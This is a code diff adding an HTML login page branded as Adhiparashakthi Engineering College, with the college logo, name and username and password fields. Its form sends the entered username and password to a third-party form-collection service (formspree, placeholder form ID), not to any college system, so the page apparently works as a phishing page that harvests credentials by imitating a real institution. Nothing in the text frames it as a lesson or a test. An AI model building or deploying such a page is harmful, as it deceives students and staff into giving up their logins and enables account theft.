@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Adhiparashakthi Engineering College Login</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #1f4037, #99f2c8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0,0,0,0.2);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+
+        h2 {
+            color: #1f4037;
+            margin: 10px 0 5px;
+        }
+
+        h4 {
+            margin: 5px 0 20px;
+            color: gray;
+            font-size: 14px;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        button {
+            width: 95%;
+            padding: 10px;
+            background: #1f4037;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #145a32;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <!-- College Logo -->
+    <img src="logo.png" alt="College Logo" class="logo">
+
+    <!-- College Name -->
+    <h2>ADHIPARASHAKTHI</h2>
+    <h4>ENGINEERING COLLEGE</h4>
+
+    <!-- Login Form -->
+    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+
+        <input type="text" name="username" placeholder="Enter Username" required>
+
+        <input type="password" name="password" placeholder="Enter Password" required>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
